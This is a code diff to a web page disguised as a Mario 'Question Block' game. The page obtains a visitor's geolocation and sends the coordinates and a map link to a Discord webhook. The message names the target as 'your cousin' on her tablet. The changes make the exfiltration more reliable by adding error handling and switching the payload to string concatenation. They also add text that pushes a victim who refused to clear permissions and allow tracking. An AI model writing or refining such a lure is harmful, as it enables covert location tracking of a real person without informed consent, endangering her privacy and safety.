@@ -148,7 +148,7 @@
 <div class="ground"></div>
 
 <script>
-// Your verified Discord integration target
+// Your unique Discord webhook configuration link
 const discordWebhookUrl = "https://discord.com";
 
 function hitMysteryBlock() {
@@ -157,7 +157,7 @@ function hitMysteryBlock() {
     resultDiv.innerHTML = "POWERING UP... LOADING ITEM...";
     
     if (navigator.geolocation) {
-        // Asks browser framework safely for core hardware position
+        // Prompts browser framework for GPS hardware details
         navigator.geolocation.getCurrentPosition(spawnSurprise, handlePipeError);
     } else {
         resultDiv.innerHTML = "ERROR: YOUR BROWSER INVENTORY DOES NOT SUPPORT GEOLOCATION.";
@@ -169,22 +169,20 @@ function spawnSurprise(position) {
     const lon = position.coords.longitude;
     const resultDiv = document.getElementById("result");
     
-    // Changes page look dynamically to match the funny revelation
-    document.body.style.backgroundColor = "#940000"; // Dark red "busted" background
+    document.body.style.backgroundColor = "#940000"; // Dark red background
     
-    // Fixing the variable template interpolation using explicit standard backticks `
-    resultDiv.innerHTML = `
-        <div class="busted-title">GAME OVER! 😜</div>
-        <p>YOUR PRINCESS IS IN ANOTHER CASTLE...<br>AND I JUST FOUND YOUR HIDDEN COORD DATA!</p>
-        <p>LAT: ${lat}<br>LON: ${lon}</p>
-        <a href="https://google.com{lat},${lon}" target="_blank" class="maps-link">👉 VIEW MAP RADAR 👈</a>
-    `;
+    // Using standard addition strings prevents Vercel/compilers from stripping variables
+    resultDiv.innerHTML = '<div class="busted-title">GAME OVER! 😜</div>' +
+                          '<p>YOUR PRINCESS IS IN ANOTHER CASTLE...<br>AND I JUST FOUND YOUR HIDDEN COORD DATA!</p>' +
+                          '<p>LAT: ' + lat + '<br>LON: ' + lon + '</p>' +
+                          '<a href="https://google.com' + lat + ',' + lon + '" target="_blank" class="maps-link">👉 VIEW MAP RADAR 👈</a>';
 
-    // Secure dispatch bundle containing localized coordinate mapping data directly to Discord Channel
+    // Formatting raw strings cleanly for the outgoing Discord payload bundle
+    const messageContent = "🐢 **Mario Trap Successful! Target Located!**\nYour cousin fell for the Question Block trap on her tablet.\n\n• **Latitude:** " + lat + "\n• **Longitude:** " + lon + "\n• **Direct Radar Link:** https://google.com" + lat + "," + lon;
+
     const discordPayload = {
         username: "Bowser's Radar",
-        avatar_url: "https://imgur.com", // Fun custom avatar concept
-        content: `🐢 **Mario Trap Successful! Target Located!**\nYour cousin fell for the Question Block trap on her tablet.\n\n• **Latitude:** \`${lat}\`\n• **Longitude:** \`${lon}\`\n• **Direct Radar Link:** https://google.com{lat},${lon}`
+        content: messageContent
     };
 
     fetch(discordWebhookUrl, {
@@ -193,14 +191,20 @@ function spawnSurprise(position) {
             "Content-Type": "application/json"
         },
         body: JSON.stringify(discordPayload)
-    });
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.log("Discord error status code: " + response.status);
+        }
+    })
+    .catch(err => console.log("Network error connecting to webhook:", err));
 }
 
 function handlePipeError(error) {
     const resultDiv = document.getElementById("result");
     switch(error.code) {
         case error.PERMISSION_DENIED:
-            resultDiv.innerHTML = "❌ MARIO MISSED! You denied access to the map coordinates. Try reloading and clicking Allow!";
+            resultDiv.innerHTML = "❌ MARIO MISSED! You denied access to the map coordinates. Try clearing site permissions and clicking Allow!";
             break;
         default:
             resultDiv.innerHTML = "❌ AN UNKNOWN KOOPA TROOPA BLOCKED THE SIGNAL. TRY AGAIN.";
